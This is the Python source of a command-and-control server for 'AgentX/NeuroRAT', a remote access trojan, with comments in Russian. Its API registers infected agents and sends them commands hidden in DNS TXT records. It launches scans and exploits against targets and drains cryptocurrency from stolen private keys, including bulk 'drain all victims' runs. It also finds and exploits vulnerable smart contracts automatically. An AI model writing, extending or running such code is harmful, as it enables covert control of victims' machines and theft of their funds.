#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
AgentX C2 Server
================

Главный центр управления и контроля для AgentX/NeuroRAT.
Обеспечивает интеграцию всех модулей и предоставляет API для админ-панели.
"""

import os
import sys
import json
import time
import argparse
import logging
from fastapi import FastAPI, HTTPException, Depends, Request, status
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from typing import Dict, List, Optional, Any, Union
import uvicorn
import asyncio
from datetime import datetime
import uuid
from web3 import Web3
import redis
import base64
from pydantic import BaseModel

# Настройка путей для корректной работы импортов
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# Импорт основных модулей
from src.exploit_manager import ExploitManager
from src.exploit_engine import ExploitEngine
from src.host_scanner import HostScanner
from src.vulnerability_scanner import VulnerabilityScanner
from src.service_detector import ServiceDetector
from src.port_scanner import PortScanner

# Импорт специальных модулей
from src.modules.web3_drainer import Web3Drainer, MEVDrainer
from src.modules.web3_contract_analyzer import Web3ContractAnalyzer
from src.autonomous_contract_scanner import AutonomousContractScanner
from src.modules.stego_tunnel import StegoTunnel
from src.modules.process_hollowing import ProcessHollowing
from src.modules.propagator import Propagator
from src.modules.dropper import Dropper

# Импорт модуля автономного агента
from src.autonomous_agent import AutonomousAgent

# Импорт Celery app и задач
from src.celery_app import celery_app, REDIS_URL
from src.tasks import analyze_contract_task, PROCESSED_CONTRACTS_SET

# --- Pydantic Models ---
class AgentTask(BaseModel):
    command: str
    params: Optional[Dict[str, Any]] = {}
    task_id: Optional[str] = None # Можно генерировать ID задачи

# Настройка логирования
log_format = "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
logging.basicConfig(
    level=logging.INFO,
    format=log_format,
    handlers=[
        logging.FileHandler("c2_server.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("c2_server")

# Создание FastAPI приложения
app = FastAPI(
    title="AgentX C2 Server",
    description="Command & Control Server for AgentX/NeuroRAT",
    version="1.0.0"
)

# Настройка CORS для взаимодействия с админ-панелью
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # В продакшене заменить на конкретные домены
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Глобальные переменные
agents = {}
operations = {}
targets = {}
crypto_operations = {}
contract_operations = {}
block_monitoring_tasks = {}
producer_redis_client = None

# Инициализация основных компонентов
exploit_manager = ExploitManager()
exploit_engine = ExploitEngine()
host_scanner = HostScanner()
vulnerability_scanner = VulnerabilityScanner()
web3_drainer = Web3Drainer()
web3_contract_analyzer = Web3ContractAnalyzer()
autonomous_contract_scanner = AutonomousContractScanner()

# --- Redis Connection for Producer ---
try:
    producer_redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True)
    producer_redis_client.ping()
    logger.info(f"C2 Server connected to Redis at {REDIS_URL} for producer logic.")
except redis.exceptions.ConnectionError as e:
    logger.error(f"C2 Server failed to connect to Redis at {REDIS_URL}: {e}. Producer deduplication disabled.")
    producer_redis_client = None

# Префиксы ключей Redis
INCOMING_PREFIX = "dns:incoming:"
OUTGOING_PREFIX = "dns:outgoing:"
# Очередь необработанных сообщений от агентов для C2
C2_INCOMING_QUEUE = "c2:incoming_messages"
# Канал Pub/Sub для уведомления C2 о новых сообщениях
C2_NOTIFICATION_CHANNEL = "c2:new_message_notify"
# Максимальный размер чанка для TXT записи (чуть меньше 255 для безопасности)
DNS_CHUNK_SIZE = 250

# --- Block Monitoring Producer Logic ---
async def _monitor_blocks_producer(chain: str, network: str, rpc_url: str, start_block: Union[str, int] = 'latest', poll_interval: int = 15):
    """Monitors new blocks, finds created contracts, and submits analysis tasks."""
    monitor_id = f"{chain}:{network}"
    logger.info(f"Starting block monitor producer for {monitor_id} using RPC: {rpc_url}")
    
    try:
        w3 = Web3(Web3.HTTPProvider(rpc_url))
        if not w3.is_connected():
            logger.error(f"Failed to connect to RPC endpoint {rpc_url} for {monitor_id}")
            return
            
        processed_block_hashes = set()
        last_processed_block_number = -1
        
        # Initialize last processed block number
        try:
             if start_block == 'latest':
                  last_processed_block_number = w3.eth.block_number
                  logger.info(f"[{monitor_id}] Starting monitor from latest block: {last_processed_block_number}")
             else:
                  last_processed_block_number = int(start_block) -1 # Start from the block before
                  logger.info(f"[{monitor_id}] Starting monitor from block: {start_block}")
        except Exception as e:
             logger.error(f"[{monitor_id}] Error getting initial block number: {e}. Using -1.")

        while True:
            try:
                latest_block_number = w3.eth.block_number
                
                if latest_block_number > last_processed_block_number:
                    # Process blocks from last_processed + 1 up to latest_block_number
                    for block_num in range(last_processed_block_number + 1, latest_block_number + 1):
                        logger.debug(f"[{monitor_id}] Processing block {block_num}")
                        block = w3.eth.get_block(block_num, full_transactions=True)
                        
                        if not block or block.hash.hex() in processed_block_hashes:
                            continue # Skip if block not found or already processed (reorg?)
                            
                        processed_block_hashes.add(block.hash.hex())
                        if len(processed_block_hashes) > 100: # Keep cache size limited
                             processed_block_hashes.pop() 
                             
                        for tx in block.transactions:
                            # Check for contract creation (to address is None)
                            if tx['to'] is None and tx.get('contractAddress'):
                                contract_address = tx['contractAddress']
                                contract_id = f"{chain}:{network}:{contract_address.lower()}"
                                logger.info(f"[{monitor_id}] New contract detected: {contract_address} in block {block_num}")
                                
                                # Check Redis if already submitted (optional but recommended)
                                should_submit = True
                                if producer_redis_client:
                                    try:
                                        # Use a different set for *submitted* tasks vs *processed* tasks?
                                        # Using PROCESSED_CONTRACTS_SET assumes tasks process reasonably fast.
                                        if producer_redis_client.sismember(PROCESSED_CONTRACTS_SET, contract_id):
                                            logger.debug(f"[{monitor_id}] Contract {contract_id} already in processed set. Skipping task submission.")
                                            should_submit = False
                                    except Exception as redis_err:
                                        logger.error(f"[{monitor_id}] Redis error checking processed set for {contract_id}: {redis_err}")
                                
                                if should_submit:
                                    # Submit analysis task to Celery queue
                                    # Note: We are not fetching source code here.
                                    analyze_contract_task.delay(contract_address, chain, network, source_code=None)
                                    logger.info(f"[{monitor_id}] Submitted analysis task for {contract_address}")
                                    # Optionally add to a 'submitted' set in Redis here
                                    
                        last_processed_block_number = block_num
                else:
                    # No new blocks
                    pass
                    
                # Wait before checking again
                await asyncio.sleep(poll_interval)
                
            except asyncio.CancelledError:
                logger.info(f"Block monitor producer {monitor_id} cancelled.")
                break # Exit the loop cleanly
            except Exception as e:
                logger.error(f"[{monitor_id}] Error in monitoring loop: {e}", exc_info=True)
                # Wait longer after an error before retrying
                await asyncio.sleep(poll_interval * 4)
                # Re-establish connection if needed
                try:
                     if not w3.is_connected():
                          w3 = Web3(Web3.HTTPProvider(rpc_url))
                          logger.info(f"[{monitor_id}] Reconnected to RPC.")
                except Exception as recon_e:
                     logger.error(f"[{monitor_id}] Failed to re-establish RPC connection: {recon_e}")
                     await asyncio.sleep(poll_interval * 10) # Wait even longer

    except Exception as outer_e:
         logger.critical(f"[{monitor_id}] Unrecoverable error setting up monitor: {outer_e}", exc_info=True)
    finally:
         logger.info(f"Stopping block monitor producer for {monitor_id}")

# --- C2 Incoming Message Processor ---
async def _process_incoming_messages():
    """Processes incoming messages from agents received via tunnels (e.g., DNS)"""
    if not producer_redis_client: # Используем тот же клиент Redis
        logger.error("Redis client not available. Cannot process incoming messages.")
        return

    logger.info("Запуск обработчика входящих сообщений от агентов...")
    # Можно использовать BLPOP для блокирующего чтения или цикл с LPOP/sleep
    # Используем цикл LPOP/sleep для простоты
    while True:
        try:
            # Извлекаем одно сообщение из очереди
            raw_message = producer_redis_client.lpop(C2_INCOMING_QUEUE)
            
            if raw_message:
                logger.info(f"Получено новое сообщение из очереди C2: {raw_message[:100]}...")
                try:
                    message_data = json.loads(raw_message)
                    session_id = message_data.get("session_id")
                    agent_data_str = message_data.get("data")
                    timestamp = message_data.get("timestamp")
                    
                    if session_id and agent_data_str:
                        logger.info(f"Сообщение от сессии {session_id}: {agent_data_str}")
                        # Ищем агента по session_id
                        found_agent_id = None
                        for agent_id, agent_info in agents.items():
                            # Проверяем все типы сессий на всякий случай
                            if agent_info.get("dns_session_id") == session_id or \
                               agent_info.get("http_session_id") == session_id or \
                               agent_info.get("icmp_session_id") == session_id:
                                found_agent_id = agent_id
                                break
                                
                        if found_agent_id:
                             logger.info(f"Сообщение от агента {found_agent_id}")
                             # Обновляем last_seen
                             agents[found_agent_id]["last_seen"] = datetime.now().isoformat()
                             # TODO: Обработать данные от агента (например, результат выполнения команды)
                             # Пока просто сохраняем последние данные
                             agents[found_agent_id]["last_data"] = agent_data_str
                             agents[found_agent_id]["last_data_timestamp"] = timestamp
                             # Пример: если данные - это результат задачи, обновить статус операции
                             # try:
                             #    result_data = json.loads(agent_data_str)
                             #    if "task_id" in result_data and result_data["task_id"] in operations:
                             #        operations[result_data["task_id"]]["status"] = "completed" # или failed
                             #        operations[result_data["task_id"]]["results"] = result_data.get("result")
                             # except:
                             #    pass # Не JSON или нет task_id
                        else:
                             logger.warning(f"Не найден агент для сессии {session_id}")
                    else:
                        logger.warning(f"Некорректный формат сообщения в очереди C2: {raw_message}")
                
                except json.JSONDecodeError:
                    logger.error(f"Ошибка декодирования JSON из очереди C2: {raw_message}")
                except Exception as e:
                     logger.error(f"Ошибка обработки сообщения из очереди C2: {e}", exc_info=True)
            
            else:
                # Очередь пуста, ждем немного
                await asyncio.sleep(5) # Пауза 5 секунд

        except redis.exceptions.ConnectionError as e:
            logger.error(f"Ошибка соединения с Redis в обработчике сообщений: {e}. Повторная попытка через 30с.")
            await asyncio.sleep(30)
        except asyncio.CancelledError:
            logger.info("Обработчик входящих сообщений остановлен.")
            break
        except Exception as e:
            logger.error(f"Критическая ошибка в обработчике сообщений: {e}", exc_info=True)
            await asyncio.sleep(60) # Пауза перед повторной попыткой

@app.get("/")
async def root():
    return {"status": "online", "name": "AgentX C2", "version": "1.0.0"}

@app.get("/api/status")
async def get_status():
    return {
        "status": "operational",
        "agents": len(agents),
        "operations": len(operations),
        "targets": len(targets),
        "crypto_operations": len(crypto_operations),
        "contract_operations": len(contract_operations),
        "server_time": datetime.now().isoformat()
    }

@app.get("/api/agents")
async def get_agents():
    return {"agents": list(agents.values())}

@app.post("/api/agents/register")
async def register_agent(agent_data: Dict[str, Any]):
    agent_id = str(uuid.uuid4())
    agent_info = {
        "id": agent_id,
        "registered_at": datetime.now().isoformat(),
        "last_seen": datetime.now().isoformat(),
        # Сохраняем исходные данные, переданные агентом
        "initial_data": agent_data,
        # Извлекаем и сохраняем ID сессий для разных туннелей (если переданы)
        "dns_session_id": agent_data.get("dns_session_id"), 
        "http_session_id": agent_data.get("http_session_id"),
        "icmp_session_id": agent_data.get("icmp_session_id"),
        "preferred_channel": agent_data.get("preferred_channel", "https") # Канал для check-in
    }
    
    agents[agent_id] = agent_info
    logger.info(f"New agent registered: {agent_id} (DNS: {agent_info['dns_session_id']}) ")
    return {"agent_id": agent_id, "status": "registered"}

@app.get("/api/exploits")
async def get_exploits():
    available_exploits = exploit_manager.list_exploits()
    return {"exploits": available_exploits}

@app.post("/api/scan/start")
async def start_scan(scan_config: Dict[str, Any]):
    operation_id = str(uuid.uuid4())
    target = scan_config.get("target")
    scan_type = scan_config.get("type", "full")
    
    operations[operation_id] = {
        "id": operation_id,
        "type": "scan",
        "target": target,
        "status": "running",
        "start_time": datetime.now().isoformat(),
        "details": scan_config
    }
    
    # Запуск сканирования в отдельном потоке
    asyncio.create_task(run_scan(operation_id, target, scan_type, scan_config))
    
    return {"operation_id": operation_id, "status": "started"}

async def run_scan(operation_id, target, scan_type, config):
    try:
        if scan_type == "host":
            results = host_scanner.scan(target)
        elif scan_type == "vulnerability":
            results = vulnerability_scanner.scan(target)
        elif scan_type == "port":
            port_scanner = PortScanner()
            results = port_scanner.scan(target)
        elif scan_type == "full":
            # Полное сканирование включает все типы
            results = {
                "host": host_scanner.scan(target),
                "vulnerability": vulnerability_scanner.scan(target),
                "ports": PortScanner().scan(target)
            }
        else:
            results = {"error": "Unknown scan type"}
        
        operations[operation_id]["status"] = "completed"
        operations[operation_id]["end_time"] = datetime.now().isoformat()
        operations[operation_id]["results"] = results
        
    except Exception as e:
        logger.error(f"Scan failed: {str(e)}")
        operations[operation_id]["status"] = "failed"
        operations[operation_id]["error"] = str(e)
        operations[operation_id]["end_time"] = datetime.now().isoformat()

@app.post("/api/crypto/drain")
async def start_crypto_drain(drain_config: Dict[str, Any]):
    operation_id = str(uuid.uuid4())
    
    crypto_operations[operation_id] = {
        "id": operation_id,
        "type": "crypto_drain",
        "status": "running",
        "start_time": datetime.now().isoformat(),
        "details": drain_config
    }
    
    # Запуск дрейнера в отдельном потоке
    asyncio.create_task(run_crypto_drain(operation_id, drain_config))
    
    return {"operation_id": operation_id, "status": "started"}

async def run_crypto_drain(operation_id, config):
    try:
        chain = config.get("chain", "ethereum")
        network = config.get("network", "mainnet")
        
        if "private_key" in config:
            # Дрейн одного аккаунта
            result = web3_drainer.drain_account(
                chain=chain,
                network=network,
                private_key=config["private_key"],
                receiver_address=config.get("receiver_address")
            )
            
        elif "private_keys_file" in config:
            # Импорт и дрейн списка ключей
            web3_drainer.import_private_keys_from_file(config["private_keys_file"])
            result = web3_drainer.drain_all_victims(chain, network)
            
        else:
            result = {"error": "No private keys provided"}
        
        crypto_operations[operation_id]["status"] = "completed"
        crypto_operations[operation_id]["end_time"] = datetime.now().isoformat()
        crypto_operations[operation_id]["results"] = result
        
    except Exception as e:
        logger.error(f"Crypto drain failed: {str(e)}")
        crypto_operations[operation_id]["status"] = "failed"
        crypto_operations[operation_id]["error"] = str(e)
        crypto_operations[operation_id]["end_time"] = datetime.now().isoformat()

@app.post("/api/mev/monitor")
async def start_mev_monitoring(mev_config: Dict[str, Any]):
    operation_id = str(uuid.uuid4())
    
    crypto_operations[operation_id] = {
        "id": operation_id,
        "type": "mev_monitoring",
        "status": "running",
        "start_time": datetime.now().isoformat(),
        "details": mev_config
    }
    
    # Запуск MEV-мониторинга в отдельном потоке
    asyncio.create_task(run_mev_monitoring(operation_id, mev_config))
    
    return {"operation_id": operation_id, "status": "started"}

async def run_mev_monitoring(operation_id, config):
    try:
        mev_drainer = MEVDrainer()
        
        if "private_keys" in config:
            for key in config["private_keys"]:
                mev_drainer.add_private_key(key)
        
        if "profit_threshold" in config:
            mev_drainer.set_profit_threshold(float(config["profit_threshold"]))
        
        chain = config.get("chain", "ethereum")
        network = config.get("network", "mainnet")
        
        # Не добавляем await, т.к. monitor_mempool блокирует поток
        # В реальном приложении стоит использовать отдельный процесс/тред
        asyncio.create_task(run_mev_monitoring_task(mev_drainer, chain, network))
        
        crypto_operations[operation_id]["status"] = "monitoring"
        
    except Exception as e:
        logger.error(f"MEV monitoring failed: {str(e)}")
        crypto_operations[operation_id]["status"] = "failed"
        crypto_operations[operation_id]["error"] = str(e)
        crypto_operations[operation_id]["end_time"] = datetime.now().isoformat()

async def run_mev_monitoring_task(mev_drainer, chain, network):
    """Отдельная задача для запуска мониторинга MEV"""
    try:
        mev_drainer.monitor_mempool(chain, network)
    except Exception as e:
        logger.error(f"MEV monitoring task failed: {str(e)}")

@app.post("/api/exploit/run")
async def run_exploit(exploit_config: Dict[str, Any]):
    operation_id = str(uuid.uuid4())
    
    operations[operation_id] = {
        "id": operation_id,
        "type": "exploit",
        "status": "running",
        "start_time": datetime.now().isoformat(),
        "details": exploit_config
    }
    
    # Запуск эксплойта в отдельном потоке
    asyncio.create_task(run_exploit_task(operation_id, exploit_config))
    
    return {"operation_id": operation_id, "status": "started"}

async def run_exploit_task(operation_id, config):
    try:
        target = config.get("target")
        exploit_name = config.get("exploit")
        exploit_params = config.get("params", {})
        
        result = exploit_engine.run_exploit(exploit_name, target, exploit_params)
        
        operations[operation_id]["status"] = "completed"
        operations[operation_id]["end_time"] = datetime.now().isoformat()
        operations[operation_id]["results"] = result
        
    except Exception as e:
        logger.error(f"Exploit failed: {str(e)}")
        operations[operation_id]["status"] = "failed"
        operations[operation_id]["error"] = str(e)
        operations[operation_id]["end_time"] = datetime.now().isoformat()

@app.post("/api/agent/autonomous")
async def activate_autonomous_agent(config: Dict[str, Any]):
    operation_id = str(uuid.uuid4())
    
    operations[operation_id] = {
        "id": operation_id,
        "type": "autonomous_agent",
        "status": "running",
        "start_time": datetime.now().isoformat(),
        "details": config
    }
    
    # Запуск автономного агента в отдельном потоке
    asyncio.create_task(run_autonomous_agent(operation_id, config))
    
    return {"operation_id": operation_id, "status": "started"}

async def run_autonomous_agent(operation_id, config):
    try:
        network_range = config.get("network_range")
        scan_duration = config.get("scan_duration", 3600)  # 1 час по умолчанию
        
        # Тут должен быть код запуска автономного агента
        
        operations[operation_id]["status"] = "running"
        
    except Exception as e:
        logger.error(f"Autonomous agent failed: {str(e)}")
        operations[operation_id]["status"] = "failed"
        operations[operation_id]["error"] = str(e)
        operations[operation_id]["end_time"] = datetime.now().isoformat()

# Новые эндпоинты для работы со смарт-контрактами

@app.post("/api/contracts/analyze")
async def analyze_contract(analyze_config: Dict[str, Any]):
    """Анализирует смарт-контракт на наличие уязвимостей"""
    operation_id = str(uuid.uuid4())
    
    contract_operations[operation_id] = {
        "id": operation_id,
        "type": "contract_analyze",
        "status": "running",
        "start_time": datetime.now().isoformat(),
        "details": analyze_config
    }
    
    # Запуск анализа в отдельном потоке
    asyncio.create_task(run_contract_analyze(operation_id, analyze_config))
    
    return {"operation_id": operation_id, "status": "started"}

async def run_contract_analyze(operation_id, config):
    try:
        chain = config.get("chain", "ethereum")
        network = config.get("network", "mainnet")
        contract_address = config.get("contract_address")
        
        if not contract_address:
            raise ValueError("Contract address is required")
        
        result = web3_contract_analyzer.analyze_contract(
            chain=chain,
            network=network,
            contract_address=contract_address
        )
        
        contract_operations[operation_id]["status"] = "completed"
        contract_operations[operation_id]["end_time"] = datetime.now().isoformat()
        contract_operations[operation_id]["results"] = result
        
    except Exception as e:
        logger.error(f"Contract analysis failed: {str(e)}")
        contract_operations[operation_id]["status"] = "failed"
        contract_operations[operation_id]["error"] = str(e)
        contract_operations[operation_id]["end_time"] = datetime.now().isoformat()

@app.post("/api/contracts/exploit")
async def exploit_contract(exploit_config: Dict[str, Any]):
    """Эксплуатирует уязвимость в смарт-контракте"""
    operation_id = str(uuid.uuid4())
    
    contract_operations[operation_id] = {
        "id": operation_id,
        "type": "contract_exploit",
        "status": "running",
        "start_time": datetime.now().isoformat(),
        "details": exploit_config
    }
    
    # Запуск эксплуатации в отдельном потоке
    asyncio.create_task(run_contract_exploit(operation_id, exploit_config))
    
    return {"operation_id": operation_id, "status": "started"}

async def run_contract_exploit(operation_id, config):
    try:
        chain = config.get("chain", "ethereum")
        network = config.get("network", "mainnet")
        contract_address = config.get("contract_address")
        vulnerability_type = config.get("vulnerability_type")
        private_key = config.get("private_key")
        exploit_params = config.get("params", {})
        
        if not contract_address:
            raise ValueError("Contract address is required")
        
        if not vulnerability_type:
            raise ValueError("Vulnerability type is required")
        
        if not private_key:
            raise ValueError("Private key is required")
        
        result = web3_contract_analyzer.exploit_vulnerability(
            chain=chain,
            network=network,
            contract_address=contract_address,
            private_key=private_key,
            vulnerability_type=vulnerability_type,
            exploit_params=exploit_params
        )
        
        contract_operations[operation_id]["status"] = "completed"
        contract_operations[operation_id]["end_time"] = datetime.now().isoformat()
        contract_operations[operation_id]["results"] = result
        
    except Exception as e:
        logger.error(f"Contract exploitation failed: {str(e)}")
        contract_operations[operation_id]["status"] = "failed"
        contract_operations[operation_id]["error"] = str(e)
        contract_operations[operation_id]["end_time"] = datetime.now().isoformat()

@app.post("/api/contracts/scanner/start")
async def start_contract_scanner(scanner_config: Dict[str, Any]):
    """Запускает автономный сканер смарт-контрактов"""
    operation_id = str(uuid.uuid4())
    
    contract_operations[operation_id] = {
        "id": operation_id,
        "type": "contract_scanner",
        "status": "starting",
        "start_time": datetime.now().isoformat(),
        "details": scanner_config
    }
    
    # Запуск сканера в отдельном потоке
    asyncio.create_task(run_contract_scanner(operation_id, scanner_config))
    
    return {"operation_id": operation_id, "status": "starting"}

async def run_contract_scanner(operation_id, config):
    try:
        # Конфигурация сканера
        config_file = config.get("config_file")
        mode = config.get("mode", "both")  # scan, exploit, both
        
        # Создаем экземпляр сканера
        scanner = AutonomousContractScanner(config_file=config_file)
        
        # Настраиваем режим работы
        if mode == "scan":
            scanner.config["exploit_enabled"] = False
        
        # Запускаем сканер
        scanner.start()
        
        contract_operations[operation_id]["status"] = "running"
        contract_operations[operation_id]["scanner_instance"] = scanner
        
        # Обновляем статистику каждые 5 минут
        while True:
            await asyncio.sleep(300)  # 5 минут
            stats = scanner.get_stats()
            contract_operations[operation_id]["stats"] = stats
            
    except Exception as e:
        logger.error(f"Contract scanner failed: {str(e)}")
        contract_operations[operation_id]["status"] = "failed"
        contract_operations[operation_id]["error"] = str(e)
        contract_operations[operation_id]["end_time"] = datetime.now().isoformat()

@app.post("/api/contracts/scanner/stop")
async def stop_contract_scanner(data: Dict[str, Any]):
    """Останавливает автономный сканер смарт-контрактов"""
    operation_id = data.get("operation_id")
    
    if not operation_id or operation_id not in contract_operations:
        raise HTTPException(status_code=404, detail="Scanner operation not found")
    
    operation = contract_operations[operation_id]
    
    if operation["type"] != "contract_scanner":
        raise HTTPException(status_code=400, detail="Not a contract scanner operation")
    
    scanner = operation.get("scanner_instance")
    if not scanner:
        raise HTTPException(status_code=400, detail="Scanner instance not found")
    
    try:
        scanner.stop()
        operation["status"] = "stopped"
        operation["end_time"] = datetime.now().isoformat()
        
        # Получаем финальную статистику
        stats = scanner.get_stats()
        operation["stats"] = stats
        
        return {"status": "stopped", "stats": stats}
    except Exception as e:
        logger.error(f"Failed to stop contract scanner: {str(e)}")
        raise HTTPException(status_code=500, detail=f"Failed to stop scanner: {str(e)}")

@app.get("/api/contracts/scanner/stats/{operation_id}")
async def get_contract_scanner_stats(operation_id: str):
    """Получает статистику работы автономного сканера смарт-контрактов"""
    if operation_id not in contract_operations:
        raise HTTPException(status_code=404, detail="Scanner operation not found")
    
    operation = contract_operations[operation_id]
    
    if operation["type"] != "contract_scanner":
        raise HTTPException(status_code=400, detail="Not a contract scanner operation")
    
    scanner = operation.get("scanner_instance")
    if not scanner:
        return {
            "stats": operation.get("stats", {}),
            "status": operation["status"]
        }
    
    try:
        stats = scanner.get_stats()
        operation["stats"] = stats
        
        return {
            "stats": stats,
            "status": operation["status"]
        }
    except Exception as e:
        logger.error(f"Failed to get scanner stats: {str(e)}")
        raise HTTPException(status_code=500, detail=f"Failed to get stats: {str(e)}")

@app.get("/api/contracts/scanner/vulnerabilities/{operation_id}")
async def get_contract_scanner_vulnerabilities(operation_id: str):
    """Получает список найденных уязвимостей в смарт-контрактах"""
    if operation_id not in contract_operations:
        raise HTTPException(status_code=404, detail="Scanner operation not found")
    
    operation = contract_operations[operation_id]
    
    if operation["type"] != "contract_scanner":
        raise HTTPException(status_code=400, detail="Not a contract scanner operation")
    
    scanner = operation.get("scanner_instance")
    if not scanner:
        return {"vulnerabilities": []}
    
    try:
        vulnerable_contracts = scanner.get_vulnerable_contracts()
        
        return {
            "vulnerabilities": vulnerable_contracts,
            "count": len(vulnerable_contracts)
        }
    except Exception as e:
        logger.error(f"Failed to get vulnerabilities: {str(e)}")
        raise HTTPException(status_code=500, detail=f"Failed to get vulnerabilities: {str(e)}")

@app.get("/api/operations")
async def get_operations():
    """Получает список всех операций"""
    all_operations = {
        **operations,
        **crypto_operations,
        **contract_operations
    }
    
    # Преобразуем в список и сортируем по времени начала (от новых к старым)
    operations_list = list(all_operations.values())
    operations_list.sort(key=lambda x: x.get("start_time", ""), reverse=True)
    
    return {"operations": operations_list}

@app.get("/api/operations/{operation_id}")
async def get_operation(operation_id: str):
    """Получает информацию о конкретной операции"""
    all_operations = {
        **operations,
        **crypto_operations,
        **contract_operations
    }
    
    if operation_id not in all_operations:
        raise HTTPException(status_code=404, detail="Operation not found")
    
    return all_operations[operation_id]

@app.post("/api/scanner/monitor/start")
async def start_block_monitor(config: Dict[str, Any]):
    """Starts the block monitoring producer for a specific chain."""
    chain = config.get("chain")
    network = config.get("network")
    rpc_url = config.get("rpc_url")
    start_block = config.get("start_block", "latest")
    poll_interval = config.get("poll_interval", 15)
    
    if not all([chain, network, rpc_url]):
        raise HTTPException(status_code=400, detail="Missing required parameters: chain, network, rpc_url")
        
    monitor_id = f"{chain}:{network}"
    if monitor_id in block_monitoring_tasks and not block_monitoring_tasks[monitor_id].done():
        raise HTTPException(status_code=400, detail=f"Monitor for {monitor_id} is already running.")
        
    # Create and store the asyncio task
    task = asyncio.create_task(
        _monitor_blocks_producer(chain, network, rpc_url, start_block, poll_interval)
    )
    block_monitoring_tasks[monitor_id] = task
    
    logger.info(f"Started block monitor task for {monitor_id}")
    return {"status": "success", "message": f"Block monitor started for {monitor_id}"}

@app.post("/api/scanner/monitor/stop")
async def stop_block_monitor(config: Dict[str, Any]):
    """Stops the block monitoring producer for a specific chain."""
    chain = config.get("chain")
    network = config.get("network")
    
    if not all([chain, network]):
        raise HTTPException(status_code=400, detail="Missing required parameters: chain, network")
        
    monitor_id = f"{chain}:{network}"
    task = block_monitoring_tasks.get(monitor_id)
    
    if not task or task.done():
        raise HTTPException(status_code=404, detail=f"Monitor for {monitor_id} not found or not running.")
        
    task.cancel()
    try:
        await task # Wait for the task to acknowledge cancellation
    except asyncio.CancelledError:
        logger.info(f"Block monitor task {monitor_id} successfully cancelled.")
        
    del block_monitoring_tasks[monitor_id]
    
    return {"status": "success", "message": f"Block monitor stopped for {monitor_id}"}

@app.get("/api/scanner/monitor/status")
async def get_monitor_status():
    """Returns the status of active block monitoring producers."""
    active_monitors = []
    for monitor_id, task in block_monitoring_tasks.items():
        if not task.done():
            active_monitors.append(monitor_id)
            
    return {"active_monitors": active_monitors, "count": len(active_monitors)}

# Ensure graceful shutdown of monitors on C2 server exit (optional)
@app.on_event("shutdown")
async def shutdown_event():
    logger.info("C2 Server shutting down. Cancelling active monitors...")
    for monitor_id, task in list(block_monitoring_tasks.items()): # Iterate over a copy
        if not task.done():
            task.cancel()
            try:
                await task
            except asyncio.CancelledError:
                pass # Expected
            logger.info(f"Cancelled monitor task {monitor_id}")
    logger.info("All active monitors cancelled.")

    # Останавливаем обработчик входящих сообщений
    if hasattr(app.state, 'incoming_message_task') and app.state.incoming_message_task:
         app.state.incoming_message_task.cancel()

    logger.info("Завершение работы сервера...")

@app.post("/api/agents/{agent_id}/tasks")
async def assign_task_to_agent(agent_id: str, task: AgentTask):
    """Assigns a task to a specific agent via their communication channel."""
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    
    agent_info = agents[agent_id]
    # TODO: Реальный механизм определения активного туннеля и session_id
    # Теперь можем получить dns_session_id из agent_info
    dns_session_id = agent_info.get("dns_session_id") # Нужно добавить это поле при регистрации!
    
    if not dns_session_id:
        raise HTTPException(status_code=400, detail="Agent does not have an active DNS tunnel session configured")

    if not producer_redis_client:
         raise HTTPException(status_code=503, detail="Redis service unavailable, cannot queue task")

    # Генерируем ID задачи, если не предоставлен
    if not task.task_id:
        task.task_id = str(uuid.uuid4())
        
    # Формируем команду для отправки (например, JSON)
    command_payload = json.dumps({
        "task_id": task.task_id,
        "command": task.command,
        "params": task.params
    })
    
    # Кодируем в base64
    encoded_command = base64.b64encode(command_payload.encode()).decode('ascii')
    
    # Разбиваем на чанки для DNS TXT
    chunks = [encoded_command[i:i+DNS_CHUNK_SIZE] 
              for i in range(0, len(encoded_command), DNS_CHUNK_SIZE)]
              
    if not chunks:
         raise HTTPException(status_code=400, detail="Cannot send empty command")

    # Записываем чанки в очередь Redis для DNS сервера
    redis_key = f"{OUTGOING_PREFIX}{dns_session_id}"
    try:
        # Используем RPUSH чтобы добавить все чанки в конец списка
        # DNS сервер будет использовать LPOP чтобы забирать по одному
        producer_redis_client.rpush(redis_key, *chunks)
        # Устанавливаем TTL, чтобы очередь не жила вечно, если агент не заберет
        producer_redis_client.expire(redis_key, 60) # 1 минута
        logger.info(f"Task {task.task_id} ({task.command}) queued for agent {agent_id} (DNS session {dns_session_id}) in {len(chunks)} chunks.")
    except redis.exceptions.RedisError as e:
        logger.error(f"Redis error queueing task for agent {agent_id}: {e}")
        raise HTTPException(status_code=500, detail="Failed to queue task due to Redis error")

    # TODO: Сохранить информацию о поставленной задаче где-то в C2
    
    return {"status": "task_queued", "task_id": task.task_id, "agent_id": agent_id, "chunks": len(chunks)}

def main():
    """Основная функция для запуска сервера"""
    parser = argparse.ArgumentParser(description="AgentX C2 Server")
    parser.add_argument("--host", default="0.0.0.0", help="Host to bind")
    parser.add_argument("--port", type=int, default=8000, help="Port to bind")
    args = parser.parse_args()
    
    logger.info(f"Starting AgentX C2 Server on {args.host}:{args.port}")
    
    # Запуск фоновых задач
    # Пример: Запуск мониторинга Ethereum по умолчанию (если нужно)
    # asyncio.create_task(_monitor_blocks_producer('ethereum', 'mainnet', os.getenv("ETH_MAINNET_RPC", ""))) 
    
    # Запуск обработчика входящих сообщений
    incoming_task = asyncio.create_task(_process_incoming_messages())
    # Сохраняем ссылку на задачу, чтобы можно было остановить при shutdown
    app.state.incoming_message_task = incoming_task
    
    # Запуск uvicorn сервера
    uvicorn.run(app, host=args.host, port=args.port)

if __name__ == "__main__":
    main() 